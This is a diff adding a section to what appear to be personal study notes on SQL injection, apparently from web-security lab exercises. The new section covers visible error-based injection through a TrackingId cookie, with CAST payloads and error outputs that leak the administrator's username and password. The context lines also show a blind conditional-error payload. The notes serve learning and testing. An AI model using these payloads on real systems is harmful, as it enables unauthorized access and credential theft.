@@ -953,10 +953,30 @@ Autal password length is 20, > 100 is false --> it will turn 200 OK
 
 TrackingId=ALWc4ei57KLITH3J' AND (SELECT CASE WHEN SUBSTR(password,1,1) = 'a' THEN TO_CHAR (1/0) ELSE 'a' END from users Where username ='administrator')= 'a'--
 __________________________________________________________________________________________________________________________________________________________________
+Visible error-based SQL injection
+---------------------------------
+Whatever the condition is true or false, it doesn't display any error -->
+TrackingId=YuyEPQKc6y6pS6lN' AND 1=2;
 
+But if your syntax is wrong, it will display error.
 
+CAST() function is used to turn into datatype.
+TrackingId=YuyEPQKc6y6pS6lN' AND 1=CAST((SELECT 1)AS INT)--
 
+in this payload > Select 1 turns into integer datatype >  integer datatype must be the same datatype with return value 1 > so it is true. 
 
+TrackingId=YuyEPQKc6y6pS6lN' AND 1=CAST((SELECT username from users LIMIT 1) AS int)--
+
+It turns error like that -->
+Unterminated String literal started at position 95 in SQL SELECT * FROM tracking where id=YuyEPQKc6y6pS6lN' AND 1=CAST((SELECT username from users LIMIT 1)
+
+That means string length is not enough to display username > so that we have to delete tracking_id -->
+TrackingId=' AND 1=CAST((SELECT username from users LIMIT 1) AS int)--;
+
+Finally it shows that --> Error: Invalid Input syntax for type integer:'administrator'
+
+Let's retrieve administrator's password -->
+TrackingId=' AND 1=CAST((SELECT password from users LIMIT 1) AS int)--;
 __________________________________________________________________________________________________________________________________________________________________
 
  
